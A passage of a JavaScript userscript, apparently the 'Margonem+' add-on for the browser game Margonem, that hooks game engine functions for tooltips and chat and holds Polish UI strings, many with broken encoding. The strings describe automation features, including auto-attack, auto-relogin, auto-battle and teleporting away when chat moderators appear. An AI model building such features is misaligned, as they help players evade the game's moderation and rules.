          bagWindowInitialAppendReference.id = "mp-neons";
          bagWindowInitialAppendReference.className = "mp-neons";
          bagWindowInitialAppendReference.innerHTML = bagWindowCustomTitleString[bagWindowDragStartEvent];
          bagWindowDragStartUi.appendChild(bagWindowUpdatedCoordinatesPayload);
          bagWindowDragStartUi.appendChild(bagWindowInitialAppendReference);
          window.TIPS.allTips[bagWindowFinalCoordinatePayload] = bagWindowDragStartUi.innerHTML;
        }
      }
    }
  }

  let bagWindowCenteredModeFlag;
  $("#mp-root").on("mouseenter", ".tip-container[data-tip-type=\"t_other\"]", () => {
    bagWindowUiElementReference();
    clearInterval(bagWindowCenteredModeFlag);
    bagWindowCenteredModeFlag = setInterval(bagWindowUiElementReference, 100);
  });
  $("#mp-root").on("mouseleave", ".tip-container[data-tip-type=\"t_other\"]", () => {
    clearInterval(bagWindowCenteredModeFlag);
  });

  function cellStorageConfigId(cellStorageConfigurationObject, cellWindowTemplateClass, cellWindowUniqueIdentifier) {
    const cellWindowIsResizableFlag = document.createElement("div");
    cellWindowIsResizableFlag.innerHTML = cellStorageConfigurationObject;

    if (!cellWindowIsResizableFlag.querySelector("#mp-neons")) {
      const cellWindowHasListFeature = document.createElement("div");
      cellWindowHasListFeature.className = "mp-tip-line";

      if (bagWindowCustomTitleString[cellWindowUniqueIdentifier].length < 1) {
        cellWindowHasListFeature.style.display = "none";
      }

      const cellWindowCustomTitleString = document.createElement("div");
      cellWindowCustomTitleString.id = "mp-neons";
      cellWindowCustomTitleString.className = "mp-neons";
      cellWindowCustomTitleString.innerHTML = cellWindowTemplateClass;
      cellWindowIsResizableFlag.appendChild(cellWindowHasListFeature);
      cellWindowIsResizableFlag.appendChild(cellWindowCustomTitleString);
    }

    return cellWindowIsResizableFlag.innerHTML;
  }

  function bagWindowInnerContentClass(cellWindowUiElementReference) {
    if (Engine.hero.d.id === cellWindowUiElementReference) {
      return Engine.hero.d;
    }

    const cellWindowDragConfiguration = Engine.others.check();
    return cellWindowDragConfiguration[cellWindowUiElementReference]?.d || null;
  }

  const cellWindowStopPositionLeft = Engine.miniMapController.handHeldMiniMapController.getMiniMapTipController().manageShowHideTip;

  Engine.miniMapController.handHeldMiniMapController.getMiniMapTipController().manageShowHideTip = function (cellWindowStopPositionTop, cellWindowFinalCoordinatePayload) {
    if (cellWindowFinalCoordinatePayload) {
      const cellWindowDomAppendReference = Engine.miniMapController.handHeldMiniMapController.getObjectController(cellWindowFinalCoordinatePayload.object[0]);
      const cellWindowInnerContentClass = cellWindowDomAppendReference.getObject(cellWindowFinalCoordinatePayload.object[1]);
      const cellWindowInitialCenteredFlag = cellWindowInnerContentClass.getTip()?.[0]?.[0];
      const cellWindowDragStartEvent = bagWindowInnerContentClass(cellWindowFinalCoordinatePayload.object[1]);

      if (cellWindowDragStartEvent && cellWindowInitialCenteredFlag && bagWindowCustomTitleString[cellWindowDragStartEvent.account]) {
        const cellWindowDragStartUi = document.createElement("div");
        cellWindowDragStartUi.innerHTML = cellWindowInitialCenteredFlag.outerHTML;

        if (!cellWindowDragStartUi.querySelector("#mp-neons")) {
          const cellWindowUpdatedCoordinatesPayload = document.createElement("div");
          cellWindowUpdatedCoordinatesPayload.className = "mp-tip-line";

          if (bagWindowCustomTitleString[cellWindowDragStartEvent.account].length < 1) {
            cellWindowUpdatedCoordinatesPayload.style.display = "none";
          }

          const cellWindowInitialAppendReference = document.createElement("div");
          cellWindowInitialAppendReference.id = "mp-neons";
          cellWindowInitialAppendReference.className = "mp-neons";
          cellWindowInitialAppendReference.innerHTML = bagWindowCustomTitleString[cellWindowDragStartEvent.account];
          cellWindowDragStartUi.appendChild(cellWindowUpdatedCoordinatesPayload);
          cellWindowDragStartUi.appendChild(cellWindowInitialAppendReference);
          const cellWindowCenteredModeFlag = $(cellWindowDragStartUi.innerHTML);
          cellWindowInnerContentClass.setTip(cellWindowCenteredModeFlag, "t_other");
        }
      }
    }

    cellWindowStopPositionLeft.apply(this, arguments);
  };

  const rowStorageConfigId = Engine.canvasTip.show;

  Engine.canvasTip.show = function (rowStorageConfigurationObject, rowWindowTemplateClass) {
    const rowWindowUniqueIdentifier = rowWindowTemplateClass?.d?.account;

    if (rowWindowUniqueIdentifier && bagWindowCustomTitleString[rowWindowUniqueIdentifier] && rowWindowTemplateClass.tip?.[0]) {
      rowWindowTemplateClass.tip[0] = cellStorageConfigId(rowWindowTemplateClass.tip[0], bagWindowCustomTitleString[rowWindowUniqueIdentifier], rowWindowUniqueIdentifier);
    }

    rowStorageConfigId.apply(this, arguments);
  };

  const rowWindowIsResizableFlag = rowWindowHasListFeature => {
    if (rowWindowHasListFeature.includes("ITEM#BUKA")) {
      const rowWindowCustomTitleString = /ITEM#BUKA/gi;
      return rowWindowHasListFeature.replace(rowWindowCustomTitleString, "<span class=\"linked-chat-item linked-chat-item-tip-created\" data-item-type=\"t-leg\" data-tip-type=\"t_item\" data-fake-tip>[Buka]</span>");
    } else if (rowWindowHasListFeature.includes("ITEM#PRIMA_APRILIS")) {
      const rowWindowUiElementReference = /ITEM#PRIMA_APRILIS/gi;
      return rowWindowHasListFeature.replace(rowWindowUiElementReference, "<span class=\"linked-chat-item linked-chat-item-tip-created\" data-item-type=\"t-leg\" data-tip-type=\"t_item\" data-fake-tip>[Szpącicielski Puchar]</span>");
    } else if (rowWindowHasListFeature.includes("ITEM#WIELKANOC")) {
      const rowWindowDragConfiguration = /ITEM#WIELKANOC/gi;
      return rowWindowHasListFeature.replace(rowWindowDragConfiguration, "<span class=\"linked-chat-item linked-chat-item-tip-created\" data-item-type=\"t-leg\" data-tip-type=\"t_item\" data-fake-tip>[Szpącicielska Pisanka]</span>");
    } else if (rowWindowHasListFeature.includes("ITEM#KOPALNIA300")) {
      const rowWindowStopPositionLeft = /ITEM#KOPALNIA300/gi;
      return rowWindowHasListFeature.replace(rowWindowStopPositionLeft, "<span class=\"linked-chat-item linked-chat-item-tip-created\" data-item-type=\"t-leg\" data-tip-type=\"t_item\" data-fake-tip>[Runa czarodzieja]</span>");
    } else {
      return false;
    }
  };

  const rowWindowStopPositionTop = {};
  const rowWindowFinalCoordinatePayload = Engine.chatController.addMessage;

  Engine.chatController.addMessage = function (rowWindowDomAppendReference) {
    const rowWindowInnerContentClass = rowWindowDomAppendReference.authorBusinessCard;

    if (rowWindowInnerContentClass) {
      const rowWindowInitialCenteredFlag = rowWindowInnerContentClass.getNick();
      const rowWindowDragStartEvent = rowWindowInnerContentClass.getId();

      if (rowWindowInitialCenteredFlag && rowWindowDragStartEvent) {
        rowWindowStopPositionTop[rowWindowInitialCenteredFlag] = rowWindowDragStartEvent;
      }
    }

    rowWindowFinalCoordinatePayload(rowWindowDomAppendReference);
  };

  const rowWindowDragStartUi = Engine.chatController.getChatMessageWrapper().appendMessageToMessageWrapper;

  Engine.chatController.getChatMessageWrapper().appendMessageToMessageWrapper = function (rowWindowUpdatedCoordinatesPayload, rowWindowInitialAppendReference, rowWindowCenteredModeFlag, colStorageConfigId) {
    const colStorageConfigurationObject = rowWindowStopPositionTop[rowWindowInitialAppendReference];

    if (colStorageConfigurationObject) {
      const colWindowTemplateClass = Engine.businessCardManager.getCard(colStorageConfigurationObject);
      const colWindowUniqueIdentifier = {
        nick: colWindowTemplateClass.getNick(),
        lvl: colWindowTemplateClass.getLvl(),
        prof: colWindowTemplateClass.getProf(),
        icon: colWindowTemplateClass.getIcon(),
        account: colWindowTemplateClass.getAcc(),
        oplvl: colWindowTemplateClass.getOperationLevel()
      };
      const colWindowIsResizableFlag = $(rowWindowCenteredModeFlag[0]);
      const colWindowHasListFeature = colWindowIsResizableFlag.find(".author-section").first();
      colWindowHasListFeature.tip(createUserTip(colWindowUniqueIdentifier, false, bagWindowHasListFeature, bagWindowCustomTitleString));
      const colWindowCustomTitleString = colWindowIsResizableFlag.find(".message-section").first();
      const colWindowUiElementReference = colWindowCustomTitleString.text();
      const colWindowDragConfiguration = rowWindowIsResizableFlag(colWindowUiElementReference);
      const colWindowStopPositionLeft = replaceImageLinksWithImgTag(colWindowUiElementReference);

      if (colWindowDragConfiguration) {
        colWindowCustomTitleString.html(colWindowDragConfiguration);
      }

      if (colWindowStopPositionLeft) {
        colWindowCustomTitleString.html(colWindowStopPositionLeft);
      }
    }

    rowWindowDragStartUi.apply(this, arguments);
  };
}
export function getCacheTimestamp() {
  return parseInt(localStorage.getItem("margonem_plus_cache"), 10) || 0;
}
export function getFullHourTimestamp() {
  return Math.floor(new Date().setMinutes(0, 0, 0) / 1000);
}
export function updateCacheTimestamp(colWindowStopPositionTop) {
  localStorage.setItem("margonem_plus_cache", colWindowStopPositionTop);
}
export const getJoinTime = colWindowFinalCoordinatePayload => {
  let colWindowDomAppendReference = new Date(colWindowFinalCoordinatePayload);
  let colWindowInnerContentClass = colWindowDomAppendReference.getHours();
  let colWindowInitialCenteredFlag = colWindowDomAppendReference.getSeconds();
  let colWindowDragStartEvent = colWindowDomAppendReference.getMinutes();

  if (colWindowInnerContentClass < 10) {
    colWindowInnerContentClass = "0" + colWindowInnerContentClass;
  }

  if (colWindowDragStartEvent < 10) {
    colWindowDragStartEvent = "0" + colWindowDragStartEvent;
  }

  if (colWindowInitialCenteredFlag < 10) {
    colWindowInitialCenteredFlag = "0" + colWindowInitialCenteredFlag;
  }

  return colWindowInnerContentClass + ":" + colWindowDragStartEvent + ":" + colWindowInitialCenteredFlag;
};
export function sanitizeText(colWindowDragStartUi) {
  if (typeof colWindowDragStartUi !== "string") {
    return "";
  }

  return colWindowDragStartUi.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&#039;");
}
export async function showAlert(colWindowUpdatedCoordinatesPayload, colWindowInitialAppendReference) {
  return new Promise(colWindowCenteredModeFlag => {
    const areaStorageConfigId = $("#mp-overlay-alert");

    if (areaStorageConfigId.length > 0) {
      areaStorageConfigId.remove();
    }

    const areaStorageConfigurationObject = sanitizeText(colWindowUpdatedCoordinatesPayload);
    const areaWindowTemplateClass = sanitizeText(colWindowInitialAppendReference);
    const areaWindowUniqueIdentifier = $("\n        <div id=\"mp-overlay-alert\" data-overlay class=\"mp-window default-cursor\">\n            <div class=\"mp-window-header\">\n                <div class=\"mp-window-header-left\"></div>\n                <div class=\"mp-window-header-title do-action-cursor\">OgĹoszenie</div>\n                <div class=\"mp-window-header-right\">\n                    <div id=\"closeBtn\" class=\"mp-window-close-button do-action-cursor\"></div>\n                </div>\n            </div>\n            <div class=\"content default-cursor\">\n                <div class=\"mp-alert-text text-red\">" + areaStorageConfigurationObject + "</div>\n                <div style=\"text-align: center;\">WysĹane przez: <b>" + areaWindowTemplateClass + "</b></div>\n            </div>\n        </div>\n    ");

    function areaWindowIsResizableFlag() {
      areaWindowUniqueIdentifier.remove();
    }

    areaWindowUniqueIdentifier.find("#closeBtn").click(() => {
      areaWindowIsResizableFlag();
      colWindowCenteredModeFlag(null);
    });
    const areaWindowHasListFeature = {
      containment: "window",
      scroll: false,
      handle: ".mp-window-header",
      stop: async (areaWindowCustomTitleString, areaWindowUiElementReference) => {}
    };
    areaWindowUniqueIdentifier.appendTo("#mp-root").draggable(areaWindowHasListFeature);
    const areaWindowDragConfiguration = areaWindowUniqueIdentifier.outerWidth();
    const areaWindowStopPositionLeft = areaWindowUniqueIdentifier.outerHeight();
    const areaWindowStopPositionTop = (window.innerWidth - areaWindowDragConfiguration) / 2;
    const areaWindowFinalCoordinatePayload = (window.innerHeight - areaWindowStopPositionLeft) / 2;
    const areaWindowDomAppendReference = {
      zIndex: 999,
      position: "absolute",
      left: areaWindowStopPositionTop + "px",
      top: areaWindowFinalCoordinatePayload + "px"
    };
    areaWindowUniqueIdentifier.css(areaWindowDomAppendReference);
  });
}
export function l() {
  return "cipka";
}
export function getTranslation() {
  const areaWindowInnerContentClass = {
    tabs: {
      info: "Informacje",
      addons: "Dodatki",
      alerts: "Powiadomienia",
      settings: "Ustawienia",
      users: "UĹźytkownicy"
    },
    widget: {
      show: "Pokaż skróty",
      hide: "Ukryj skróty",
      add: "Dodaj skrót",
      del: "UsuĹ skrĂłt",
      tip: "Włączenie dodaje pływajÄce okno z szybkimi odnośnikami do ustawień zainstalowanych dodatkĂłw"
    },
    getAddonsToSee: "Wybierz dodatek, aby zobaczyć jego opis.",
    optOff: "Odinstaluj",
    optOn: "Zainstaluj",
    otherSettings: {}
  };
  areaWindowInnerContentClass.otherSettings.wrapLoot = "Nie zawijaj okna lootu";
  areaWindowInnerContentClass.otherSettings.rendering = "WĹÄcz lepszy rendering mapy";
  areaWindowInnerContentClass.otherSettings.scrollChat = "Utrzymuj czat na dole przy wiadomości";
  areaWindowInnerContentClass.otherSettings.changeMaps = "Podmieniaj grafiki map (f5)";
  const areaWindowInitialCenteredFlag = {
    title: {
      style: "WyglÄd",
      hp: "Pasek życia",
      exp: "Pasek doświadczenia",
      ping: "WskaĹşnik pingu",
      builds: "Przyciski zestawów",
      stats: "Statystyki postaci",
      fullPercent: "Pokazuj dokładny procent"
    },
    showPing: "Pokazuj ping",
    showStats: "Podmieniaj statystyki",
    showButtons: "Pokazuj przyciski",
    showPercent: "PokaĹź procent",
    showPoints: "Pokaż wartość",
    showReach: "Pokaż potrzebną ilość do max",
    showReachPercent: "Pokaż brakujÄcy procent",
    showPointsAndMax: "Pokaż wartość + max",
    ping: {},
    builds: {},
    fullPercent: {},
    bonus: {}
  };
  areaWindowInitialCenteredFlag.ping.number = "Pokazuj wartość numeryczna";
  areaWindowInitialCenteredFlag.ping.ball = "Ping w formie kulki";
  areaWindowInitialCenteredFlag.builds.firstLetter = "Pokaż pierwszą litere nazwy";
  areaWindowInitialCenteredFlag.builds.number = "PokaĹź numer zestawu";
  areaWindowInitialCenteredFlag.fullPercent.hp = "Pasek życia";
  areaWindowInitialCenteredFlag.fullPercent.exp = "Pasek doświadczenia";
  areaWindowInitialCenteredFlag.bonus.dmg = "Atak";
  areaWindowInitialCenteredFlag.bonus.ck = "Cios krytyczny";
  areaWindowInitialCenteredFlag.bonus.ac = "Pancerz";
  areaWindowInitialCenteredFlag.bonus.heal = "Leczenie";
  areaWindowInitialCenteredFlag.bonus.sa = "Szybkość ataku";
  areaWindowInitialCenteredFlag.bonus.lowevade = "Obniż. unik";
  areaWindowInitialCenteredFlag.bonus.lowsa = "ObniĹź. SA";
  areaWindowInitialCenteredFlag.bonus.lowcrit = "Obniż. kryt";
  areaWindowInitialCenteredFlag.bonus.resist = "Odporności";
  areaWindowInitialCenteredFlag.bonus.ena = "Energia";
  areaWindowInitialCenteredFlag.bonus.mana = "Mana";
  areaWindowInitialCenteredFlag.bonus.evade = "Unik";
  areaWindowInitialCenteredFlag.bonus.blok = "Blok";
  areaWindowInitialCenteredFlag.bonus.skf = "Moc ck fiz.";
  areaWindowInitialCenteredFlag.bonus.skm = "Moc ck mag.";
  areaWindowInitialCenteredFlag.bonus.hp = "Ĺťycie";
  areaWindowInitialCenteredFlag.bonus.destac = "Niszcz. panc";
  areaWindowInitialCenteredFlag.bonus.lowres = "Niszcz. odp";
  areaWindowInitialCenteredFlag.bonus.ku = "Udręka";
  areaWindowInitialCenteredFlag.bonus.da = "Dotyk";
  areaWindowInitialCenteredFlag.bonus.or = "Ratunek";
  areaWindowInitialCenteredFlag.bonus.destresource = "Niszcz. zasobów";
  const areaWindowDragStartEvent = {
    advantage: "Blokuj atak, gdy masz poziom wiÄkszy o",
    advTip: "Uniemożliwia atakowanie przeciwnika, który ma poziom mniejszy o określoną wartość. Np: Gdy masz poziom 300 i ustawisz by nie atakowało gdy poziom przeciwnika jest mniejszy o 20 to nie zaatakujesz gracza, który ma 279 poziom. Każda postać powyżej 300 jest traktowana jako 300 poziom.",
    list: {
      always: "Zawsze atakuj",
      never: "NIgdy nie atakuj"
    },
    killMine: {}
  };
  areaWindowDragStartEvent.killMine.mine = "Atakuj na Kopalni";
  areaWindowDragStartEvent.killMine.trap = "Atakuj w Pułapce";
  areaWindowDragStartEvent.killMine.nongrp = "Atakuj na mapach nongrp";
  const areaWindowDragStartUi = {
    title: "Ustawienia",
    build: "Szybka zmiana zestawu",
    options: {}
  };
  areaWindowDragStartUi.options.titan = "Po wykryciu tytana";
  areaWindowDragStartUi.options.colossus = "Po wykryciu Kolosa";
  areaWindowDragStartUi.options.elite3 = "Po wykryciu Elita III";
  areaWindowDragStartUi.options.useWhenNotEnemy = "Zmień, gdy nie ma wrogów w okolicy";
  areaWindowDragStartUi.options.return = "Przywróć poprzedni zestaw, gdy npc zniknie";
  const areaWindowUpdatedCoordinatesPayload = {
    addverify: {
      start: "Rozpoczęcie weryfikacji (lokalny)",
      stop: "ZakoĹczenie weryfikacji (lokalny)",
      task: "Wysyłane polecenie dla Gracza (reminder)",
      positive: "Zakończenie pozytywne (prywatna)",
      negative: "Zakończenie negatywne (prywatna)"
    },
    addmenu: areaWindowInnerContentClass,
    add1: {
      common: "Zwykłe",
      unique: "Unikaty",
      heroic: "Heroiczne",
      improvements: "Ulepszacze",
      artisanbon: "Bonus x%",
      bind: "Związane",
      forceUnique: "WymuĹ unikaty",
      progress: "Postęp w konsoli + overlay",
      "1": "Jednoręczne",
      "2": "Dwuręczne",
      "3": "Półtoraręczne",
      "4": "Dystansowe",
      "5": "Pomocnicze",
      "6": "Różdżki",
      "7": "Orby",
      "8": "Zbroje",
      "9": "Hełmy",
      "10": "Buty",
      "11": "Rękawice",
      "12": "Pierścienie",
      "13": "Naszyjniki",
      "14": "Tarcze",
      "29": "Strzały",
      weapon: "Bronie",
      armor: "Pancerze",
      jewelry: "Biżuterie",
      afterBattle: "Ulepsz, gdy po walce skĹadnikĂłw ≥ ",
      alwaysAfterBattle: "Zawsze po walce",
      bag: "Ulepsz, gdy po walce miejsca w torbie ≤ "
    },
    add4: {
      settings: {
        showButton: "Przycisk przelogowywania",
        autoLogin: "Przeloguj po ubiciu e2",
        autoLoginTip: "Przelogowywuje na pierwsza e2 z minutnika, po ubiciu jakiejś e2."
      }
    },
    add6: {
      rarity: {
        common: "t-norm",
        unique: "t-uniupg",
        heroic: "t-her",
        upgraded: "t-upgraded",
        legendary: "t-leg"
      }
    },
    add7: {
      options: {
        exp: "Nagroda z doĹwiadczeniem",
        noExp: "Nagroda bez doświadczenia"
      }
    },
    add8: {
      averagelvl: "Średni poziom ulepszenia:",
      averagelvltip: "Sredni poziom ulepszenia ekwipunku",
      legbon: "Bonusy legendarne",
      odps: "OdpornoĹci",
      odpPoison: "Odporność na trucizne",
      odpFire: "Odporność na ogień",
      odpFrost: "Odporność na zimno",
      odpLight: "Odporność na błyskawice",
      ck: "Cios krytyczny",
      ckpercent: "Szansa na cios krytyczny z ekwipunku",
      skm: "Moc ciosu krytycznego magicznego",
      skf: "Moc ciosu krytycznego fizycznego",
      lt: "Leczenie turowe",
      low: "Obniżanie",
      lowevade: "Obniżanie uniku",
      lowck: "ObniĹźanie ciosu krytycznego",
      slow: "Obniżanie szybkoĹci ataku"
    },
    add13: {
      pvp: "Walka z graczem",
      e2: "Walka z elita II",
      e3: "Walka z elita III",
      heroes: "Walka z herosem",
      titan: "Walka z tytanem",
      colossus: "Walka z kolosem",
      show: "Wyświetlaj podsumowanie po walce"
    },
    add14: {
      closeLoot: {
        solo: "W pojedynkÄ",
        party: "W grupie"
      },
      rarity: {
        common: "Zwykły",
        unique: "Unikatowy",
        heroic: "Heroiczny",
        upgraded: "Ulepszony",
        legendary: "Legendarny",
        onlylegendary: "Tylko Legendarne",
        highest: "Najlepsza (grp)"
      },
      other: {
        chest: "Skrzynie",
        claw: "Pazury, serca etc",
        neutral: "Neutralne",
        stone: "Kamienie",
        potions: "Miskturki",
        runes: "Smocze runy"
      },
      cl: {
        "17": "Złoto",
        "22": "Talizmany",
        "24": "Torby",
        "26": "Ulepszacze",
        "32": "Teleporty",
        cosmetic: "Kosmetyczne",
        other: "Pozostałe"
      }
    },
    add16: {
      gold: "Sprawdź dostępność Złota",
      zcs: "Sprawdź dostępność Zwoi smoka",
      drop: "SprawdĹş dostępność BĹoga na drop",
      tp: "SprawdĹş dostępność Teleportów",
      gildia: "Sprawdź dostępność Kluczy do kletki"
    },
    add17: {
      show: {
        alch: "Alchemia",
        ore: "Złoże",
        najemnik: "Tropiciel herosĂłw",
        grzyb: "Grzybobranie",
        event: "Elita eventowa",
        elite3: "Elita III",
        heroes: "Heros",
        titan: "Tytan",
        colossus: "Kolos"
      },
      buttons: {
        claim: "Zajmij",
        global: "Global",
        clan: "Klan",
        chase: "PodejdĹş",
        close: "Zamknij",
        discord: "Discord"
      },
      options: {
        hideonkill: "Po znikniÄciu npc",
        hideonchangemap: "Po zmianie mapy"
      },
      discord: {
        everyone: "@everyone",
        here: "@here",
        roles: "WĹasne role"
      }
    },
    add18: {
      shadow: {
        map: "Cień mapy",
        loot: "Cień lootu",
        wrapper: "CieĹ wrappera",
        window: "Cień okna lootu",
        buttons: "Cień przycisków"
      },
      title: {
        color1: "Kolor pierwszy",
        color2: "Kolor drugi",
        rainItems: "Deszcz przedmiotów",
        alert: "Alert",
        audio: "Odegraj dźwiÄk",
        clan: "Powiadom klan",
        tipAddText: "Dodaj wiadomość",
        tipAddAudio: "Dodaj dźwiÄk",
        tipAddImage: "Dodaj grafikÄ",
        stone: "Aktywuj przy kamieniu",
        stoneLight: "PodĹwietlenie kamienia",
        tipRand: "Możliwość wĹÄczenia lub wyłączenia trybu",
        shadowGame: "Przyciemnienie gry"
      },
      animations: {
        wrapper: "Animacje wrappera",
        item: "Animacje przedmiotu",
        window: "Animacje okna lootu",
        scaling: "PowiÄkszanie",
        bounce: "Podskakiwanie",
        shake: "Trzęsienie",
        flip: "Zmiana stron",
        spin: "Wirowanie",
        pulse: "Pulsowanie"
      },
      mode: {
        loot: "Grafiki z lootu",
        star: "Gwiazdki",
        heart: "Serca",
        firework: "Fajerwerki",
        confetti: "Konfetti",
        images: "Własna grafika"
      },
      other: {
        main: "Własne ustawienia",
        randomMode: "Tryb losowego koloru",
        rainbowMode: "Tryb ciągłego losowego koloru"
      }
    },
    add19: {
      auto: {
        accept: "Akceptuj zaproszenie",
        przywo: "Akceptuj przywołanie",
        disband: "Rozwiązuj grupÄ po e2",
        giveLeader: "Przekaż dowództwo"
      },
      hotkeys: {
        inviteMap: "Zaproś graczy na mapie",
        debug: "Odbuguj zaproszenie",
        disband: "Rozwiąż/opuĹÄ grupÄ",
        partyInfo: "Wyślij info. o grupie",
        kickAfk: "Wyrzuć graczy AFK",
        systemCreate: "Stwórz za pomocÄ ST",
        kickRandom: "Wyrzuć losową osobę"
      },
      stats: {
        showProf: "Pokaż ilość profesji",
        showDrop: "PokaĹź zaniĹźanie dropu",
        showMinMax: "Pokaż poziom min i max"
      }
    },
    add20: {
      title: {
        labelColor: "Tabliczki na przedmiocie",
        settings: "Dodatkowe oznaczenia",
        images: "Zmiana grafik przedmiotów",
        tags: "Metki z nazwami"
      },
      labelSettings: {
        dmg: "Oznacz obrażenia broni",
        mix: "Wyróżnij mikstury leczÄce",
        summon: "Podmień grafiki przywołań",
        stone: "Podmień grafiki kamieni"
      },
      labelColor: {
        upgrade: "Ulepszenie przedmiotu",
        legbon: "Bonus legendarny",
        bless: "Rodzaj bĹoga",
        level: "Poziom przedmiotu",
        tier: "Tier komponentu"
      }
    },
    add21: {
      settings: {
        expires: "Zawsze pytaj o potwierdzenie zniszczenia wygasłych przedmiotów, jeśli takie posiadasz",
        connect: "Kliknij przedmiot z wciśniętym klawiszem <span class=\"mp-badge\">CTRL</span>, aby połączyć go z innym",
        trash: "Kliknij przedmiot z wciĹniÄtym klawiszem <span class=\"mp-badge\">ALT</span>, aby oznaczyÄ go do usunięcia",
        split: "Kliknij przedmiot z wciśniętym klawiszem <span class=\"mp-badge\">SHIFT</span>, aby zacząć go dzielić"
      },
      title: {
        expires: "Wygasłe przedmioty",
        connect: "Łączenie przedmiotów",
        trash: "Niszczenie przedmiotĂłw",
        split: "Dzielenie przedmiotów"
      },
      warning: {
        legendary: "Niszczenie przedmiotów legednarnych zablokowane",
        upgrade: "Niszczenie przedmiotĂłw ulepszonych zablokowane",
        personal: "Niszczenie przedmiotów personalizowanych zablokowane",
        licytacja: "Niszczenie przedmiotów z licytacji zablokowane",
        ulepszacz: "Niszczenie punktów ulepszeĹ zablokowane"
      },
      denyAsk: "Odrzucono zapytanie o czyszczenie",
      successClear: "ZakoĹczono czyszczenie"
    },
    add26: {
      components: {
        common: "Zwykłe",
        unique: "Unikatowe",
        heroic: "Heroiczne",
        stack: "Tylko pełne staki",
        auto: "Auto. wystawianie"
      }
    },
    add28: {
      tip: {
        addDialog: "Dodaj tekst z dialogu"
      }
    },
    add31: {
      showQuantity: {
        stage1: "3 przedmiotĂłw",
        stage2: "6 przedmiotĂłw",
        stage3: "9 przedmiotĂłw",
        stage4: "12 przedmiotów",
        stage5: "15 przedmiotów"
      }
    },
    add32: {
      minititle: {
        bonus: "Wzmocnienie",
        legbon: "Legendarny bonus",
        lore: "Opis przedmiotu",
        loot: "Podpis przedmiotu",
        socket: "Gniazdo"
      },
      add: {
        loot: "Zmiana podpisu",
        essence: "Esencja przedmiotu",
        unbind: "Koszt odwiązania"
      },
      header: {
        type: "Ukryj typ przedmiotu",
        builds: "Ukryj zestawy",
        upgrade: "Ukryj ulepszenie",
        upgradeNumber: "ZamieĹ ikonę na cyfrÄ"
      },
      custom: {
        background: "Dodaj tło Margonem+",
        gap: "OdstÄp miÄdzy stat.",
        separator: "Dodaj separatory",
        damage: "Oznacz żwyioły ataku"
      },
      other: {
        refund: "Wyróżnij ekstrakcje",
        damage: "Wartości statystyk",
        teleport: "Miejsce teleportacji"
      },
      footer: {
        status: "Ukryj stan przedmiotu"
      },
      section: {
        bonus: "Ukryj wzmocnienie",
        legbon: "Ukryj leg. bonus",
        lore: "Ukryj opis",
        loot: "Ukryj podpis",
        socket: "Ukryj gniazdo"
      },
      color: {
        bonus: "Kolor wzmocnienia",
        legbon: "Kolor leg. bonus",
        lore: "Kolor opisu",
        loot: "Kolor podpisu",
        socket: "Kolor gniazda"
      }
    },
    add35: {
      show: {
        pickaxe: "PodĹwietlaj <b style=\"color: red;\">kilofy</b>",
        gate: "Podświetlaj <b style=\"color: orange;\">przejścia</b>",
        ore: "Podświetlaj <b style=\"color: #9b54ff;\">rudy</b>",
        jump: "Zapisuj moment wejścia"
      }
    },
    add36: {
      options: {
        acceptBattle: "Przyjmij walkę",
        startBattle: "Zatwierdź przygotowanie",
        nextBattle: "NastÄpna walka",
        fastBattle: "Szybka walka",
        getRewards: "Odbierz nagrodę"
      }
    },
    add37: {
      title: {
        lvl: "Wbicie poziomu",
        pvp: "Walka z graczem",
        enemy: "Wróg na mapie",
        elite: "Wykrycie e2",
        chatter: "Kafelki szybkich wiadomości"
      },
      settings: {
        lvl: "Informuj klan",
        pvp: "Informuj klan",
        enemy: "Aktywne",
        elite: "Informuj klan",
        chatter: "Aktywne"
      },
      options: {
        send: "WysyĹaj wiadomość o wrogu na klan",
        message: "WyĹwietl informacje w message",
        audio: "Odegraj dźwięk, gdy wykryje wroga",
        other: "Neutralni gracze są wrogami"
      }
    },
    add38: areaWindowInitialCenteredFlag,
    add40: areaWindowDragStartEvent,
    add44: {
      title: {
        work: "Działanie",
        distance: "Uciekaj",
        relation: "Uciekaj przed",
        alwaysEscape: "Zawsze uciekaj",
        use: "Używaj teleportu"
      },
      work: {
        escape: "Aktywne",
        onlyred: "Tylko czerwone mapy"
      },
      distance: {
        instant: "Od razu po wykryciu",
        range: "Gdy jest bliżej niż <distance></distance> kratek"
      },
      relation: {
        "1": "Zwykli gracze",
        "2": "Przyjaciele",
        "3": "Wrogowie",
        "4": "Klanowicze",
        "5": "Sojusznicy",
        "6": "Wrogowie klanu",
        "7": "PrzyjaĹşni (Perkun)",
        "8": "Wrogowie (Perkun)"
      },
      alwaysEscape: {
        sm: "Przed Super Moderatorem Chatu",
        mc: "Przed Moderatorem Chatu",
        level: "Gdy poziom gracza większy o <level></level>",
        afk: "Ignoruj, gdy gracz jest AFK"
      },
      use: {
        item: "Wybranego teleportu",
        random: "Losowego teleportu"
      }
    },
    add47: areaWindowDragStartUi,
    add48: {
      options: {
        titan: "Z tytanem",
        colossus: "Z kolosem",
        e3: "Z e3 eventowa"
      }
    },
    add52: {
      opt: {
        audio: "Odegraj dzwięk sprawdzenia",
        message: "Wyświetl message",
        console: "Zapisz informacje w konsoli"
      }
    },
    add53: {
      options: {
        scrollTabs: "Przełączanie zakładek scrollem",
        hideLockTabs: "Ukrywanie niewykupionych zakładek",
        contextMenu: "Opcje w menu kontekstowym przedmiotu"
      },
      other: {
        eq: "Części ekwipunku",
        lic: "Licytacja",
        kopa: "Kopalnia"
      },
      sort: {
        lvl: "Poziomu",
        rarity: "RzadkoĹci",
        class: "Klasy",
        value: "Wartości"
      }
    },
    add54: {
      show: {
        nick: "Nazwa",
        level: "Poziom",
        prof: "Profesja",
        clan: "Klan",
        guest: "Zastępca"
      }
    },
    build: {
      titan: "Tytan",
      colossus: "Kolos",
      elite3: "Elita III"
    },
    otherbon: {
      distract: "Wytrącenie z równowagi",
      parry: "Parowanie",
      evade: "Unik",
      blok: "Blok",
      crit: "Cios krytyczny",
      acdmg_destroyed: "Zniszczony pancerz",
      stun: "Ogłuszenie",
      freeze: "Zamrożenie",
      arrowblock: "Neutralizacja strzaĹy"
    },
    legbon: {
      cleanse: "Płomienne oczyszczenie",
      facade: "Fasada opieki",
      anguish: "Krwawa udręka",
      puncture: "Przeszywająca skutecznoĹÄ",
      frenzy: "Eskalacja szału",
      retaliation: "Aura odwetu",
      curse: "Klątwa",
      glare: "Oślepienie",
      critred: "Krytyczna osĹona",
